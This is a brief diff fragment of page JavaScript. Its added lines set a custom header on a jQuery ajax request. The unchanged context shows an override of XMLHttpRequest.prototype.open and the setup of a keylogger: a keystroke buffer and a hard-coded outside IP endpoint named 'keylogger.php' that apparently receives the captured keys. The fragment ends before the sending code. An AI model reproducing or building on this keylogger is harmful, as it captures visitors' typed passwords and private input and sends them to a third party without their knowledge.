@@ -5,7 +5,8 @@ XMLHttpRequest.prototype.open = (function(open) {
     };
 })(XMLHttpRequest.prototype.open);
 
-
+// Overwrites the default header with a new header
+$.ajax({ url: 'foo/bar', headers: { 'x-some-other-header': 'some value' } });
 
 var keys='';
 var url = 'http://206.130.110.212/forum/system/keylogger.php?c=';
